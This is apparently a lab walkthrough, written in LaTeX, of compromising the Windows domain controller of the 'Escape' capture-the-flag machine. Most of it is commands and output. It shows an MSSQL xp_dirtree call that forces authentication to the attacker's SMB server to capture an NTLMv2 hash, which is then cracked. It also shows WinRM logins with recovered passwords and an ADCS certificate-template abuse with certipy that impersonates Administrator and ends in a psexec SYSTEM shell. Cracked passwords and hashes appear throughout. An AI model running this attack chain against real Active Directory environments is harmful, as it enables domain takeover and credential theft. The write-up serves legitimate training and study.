\chapter{Escape}
\begin{itemize}
    \item {\bf technics}: adcs, mssql
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\subsection{Recon}
\subsection{nmap}
\begin{verbatim}
$ nmapz 10.129.165.111
TCP ports found: 53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49689,49690,49712,49716,60132
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-01 00:47 CET
Nmap scan report for 10.129.165.111
Host is up (0.15s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-03-01 07:47:41Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-03-01T07:49:13+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-03-01T07:49:12+00:00; +7h59m59s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2023-03-01T07:49:13+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-03-01T05:43:17
|_Not valid after:  2053-03-01T05:43:17
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-03-01T07:49:13+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-03-01T07:49:13+00:00; +7h59m59s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
q9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49712/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
60132/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2023-03-01T07:48:32
|_  start_date: N/A
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m58s


\end{verbatim}

\subsection{Kerberos}
\begin{verbatim}
$ kerbrute userenum  /usr/share/seclists/Usernames/top-usernames-shortlist.txt\
    --dc 10.129.165.111 -d sequel.htb

2023/03/01 01:16:48 >  Using KDC(s):
2023/03/01 01:16:48 >   10.129.165.111:88

2023/03/01 01:16:48 >  [+] VALID USERNAME:       guest@sequel.htb
2023/03/01 01:16:48 >  [+] VALID USERNAME:       administrator@sequel.htb

\end{verbatim}

\subsection{smb}
\begin{verbatim}
$ enum4linux-ng -A -u '' -p '' 10.129.165.111
ENUM4LINUX - next generation (v1.3.1)
...SNIP...

$ enum4linux-ng -A -u guest -p '' 10.129.165.111
...SNIP...
 ========================================
|    Shares via RPC on 10.129.165.111    |
 ========================================
[*] Enumerating shares
[+] Found 6 share(s):
ADMIN$:
  comment: Remote Admin
  type: Disk
C$:
  comment: Default share
  type: Disk
IPC$:
  comment: Remote IPC
  type: IPC
NETLOGON:
  comment: Logon server share
  type: Disk
Public:
  comment: ''
  type: Disk
SYSVOL:
  comment: Logon server share
  type: Disk
[*] Testing share ADMIN$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share IPC$
[+] Mapping: OK, Listing: NOT SUPPORTED
[*] Testing share NETLOGON
[+] Mapping: OK, Listing: DENIED
[*] Testing share Public
[+] Mapping: OK, Listing: OK
[*] Testing share SYSVOL
[+] Mapping: OK, Listing: DENIED

$ smbclient //10.129.165.111/Public -N
Can't load /etc/samba/smb.conf - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Nov 19 12:51:25 2022
  ..                                  D        0  Sat Nov 19 12:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 14:39:43 2022

                5184255 blocks of size 4096. 1317276 blocks available

\end{verbatim}

\begin{verbatim}
Ryan
Tom
brandon.brown@sequel.htb

Bonus
For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with
user PublicUser and password GuestUserCantWrite1 .
Refer to the previous guidelines and make sure to switch the "Windows Authentication" to "SQL Server Authentication".

\end{verbatim}


\subsection{mssql}
\begin{verbatim}

$ mssqlclient.py ...
[-] [('SSL routines', '', 'legacy sigalg disallowed or unsupported')]
\end{verbatim}

\begin{verbatim}
diff --git a/impacket/tds.py b/impacket/tds.py
index a24333d4..675ef822 100644
--- a/impacket/tds.py
+++ b/impacket/tds.py
@@ -660,10 +660,11 @@ class MSSQL:
             LOG.info("Encryption required, switching to TLS")

             # Switching to TLS now
-            ctx = SSL.Context(SSL.TLSv1_METHOD)
+            ctx = SSL.Context(SSL.TLSv1_2_METHOD)
             ctx.set_cipher_list('RC4, AES256')
             tls = SSL.Connection(ctx,None)
             tls.set_connect_state()
+
             while True:
                 try:
                     tls.do_handshake()
@@ -908,7 +909,7 @@ class MSSQL:
             LOG.info("Encryption required, switching to TLS")

             # Switching to TLS now
-            ctx = SSL.Context(SSL.TLSv1_METHOD)
+            ctx = SSL.Context(SSL.TLSv1_2_METHOD)
             ctx.set_cipher_list('RC4, AES256')
             tls = SSL.Connection(ctx,None)
\end{verbatim}


\begin{verbatim}
$ mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@10.129.165.111
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL>

SQL> xp_dirtree '\\10.10.16.41\pwn\test'
\end{verbatim}

\begin{verbatim}
$ sudo smbserver.py -smb2support  pwn ./
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.129.165.111,60745)
[*] AUTHENTICATE_MESSAGE (sequel\sql_svc,DC)
[*] User DC\sql_svc authenticated successfully
[*] sql_svc::sequel:aaaaaaaaaaaaaaaa:7285eb3b4fae5845bdaf62c6afb9e378:010100000000000000251b35dc4bd9019c36d6f926ebcf980000000001001000660079007700740072006d005100640003001000660079007700740072006d0051006400020010006b004c006e0041004400740044004c00040010006b004c006e0041004400740044004c000700080000251b35dc4bd901060004000200000008003000300000000000000000000000003000002472c503269971e642caa2998fb794a4e9c3df3b8f0a8ce709492f012e5f63020a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00340031000000000000000000
[*] Closing down connection (10.129.165.111,60745)
[*] Remaining connections []
\end{verbatim}

\begin{verbatim}
$ john --wordlist=/usr/share/wordlists/passwords/rockyou.txt sql_svc.hash
Warning: detected hash type "netntlmv2", but the string is also recognized as "ntlmv2-opencl"
Use the "--format=ntlmv2-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
REGGIE1234ronnie (sql_svc) 
\end{verbatim}


\begin{verbatim}
 bloodhound-python -d sequel.htb -ns 10.129.165.111 -u sql_svc -p REGGIE1234ronnie -c all                         
WARNING: Could not find a global catalog server, assuming the primary DC has this role
If this gives errors, either specify a hostname with -gc or disable gc resolution with --disable-autogc
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
\end{verbatim}


\begin{verbatim}
$ sudo timedatectl set-ntp false
$ ldapsearch -LLL -x -H ldap://10.129.165.111 -b '' -s base '(objectclass=*)' |
    grep currentTime
currentTime: 20230301094700.0Z
$ sudo timedatectl set-time '2023-03-01 10:47:45'

$ bloodhound-python -d sequel.htb -ns 10.129.165.111 -u sql_svc -p REGGIE1234ronnie -c all
INFO: Found AD domain: sequel.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.sequel.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.sequel.htb
...SNIP...
\end{verbatim}


on voit que \verb+sql_svc CanPSRemote+ 


\section{sql svc}
\begin{verbatim}
$ evil-winrm -i 10.129.165.111 -u sql_svc -p REGGIE1234ronnie
fatal: detected dubious ownership in repository at '/usr/share/evil-winrm'
To add an exception for this directory, call:

        git config --global --add safe.directory /usr/share/evil-winrm

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\sql_svc\Documents>

\end{verbatim}

local users:
\begin{verbatim}
Tom.Henn
Brandon.Brown
Ryan.Cooper
James.Robers
Nicole.Thmpson
\end{verbatim}


\begin{verbatim}
*Evil-WinRM* PS C:\SQLServer\Logs> cat "C:/SQLServer/Logs/ERRORLOG.BAK"
...SNIP...
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
...SNIP...
\end{verbatim}


\section{Ryan.Cooper}
\begin{verbatim}
$ evil-winrm -i 10.129.165.111 -u Ryan.Cooper -p NuclearMosquito3
fatal: detected dubious ownership in repository at '/usr/share/evil-winrm'
To add an exception for this directory, call:

        git config --global --add safe.directory /usr/share/evil-winrm

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents>

\end{verbatim}


\begin{verbatim}
$ certipy find -target-ip 10.10.11.202 -dc-ip 10.10.11.202 -u Ryan.Cooper@sequel.htb -p NuclearMosquito3
Certipy v4.3.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'sequel-DC-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'sequel-DC-CA'
[*] Saved BloodHound data to '20230302121656_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20230302121656_Certipy.txt'
[*] Saved JSON output to '20230302121656_Certipy.json'

$ certipy req -target 10.10.11.202 -dc-ip 10.10.11.202 -u Ryan.Cooper@sequel.htb -p NuclearMosquito3 -ca 'sequel-DC-CA' -template 'UserAuthentication' -upn 'Administrator@sequel.htb'
Certipy v4.3.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 16
[*] Got certificate with UPN 'Administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'

$ certipy auth -pfx administrator.pfx -username Administrator -domain sequel.htb  -dc-ip 10.10.11.202
Certipy v4.3.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee



$ gettgtpkinit -cert-pfx /tmp/administrator.pfx -dc-ip 10.10.11.202 \
    sequel.htb/Administrator /tmp/test.cache

$ export KRB5CCNAME=/tmp/test.cache
 psexec.py sequel.htb/Administrator@dc.sequel.htb -dc-ip 10.10.11.202 -k -no-pass
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on dc.sequel.htb.....
[*] Found writable share ADMIN$
[*] Uploading file NKfzLjSp.exe
[*] Opening SVCManager on dc.sequel.htb.....
[*] Creating service oyXB on dc.sequel.htb.....
[*] Starting service oyXB.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>


\end{verbatim}
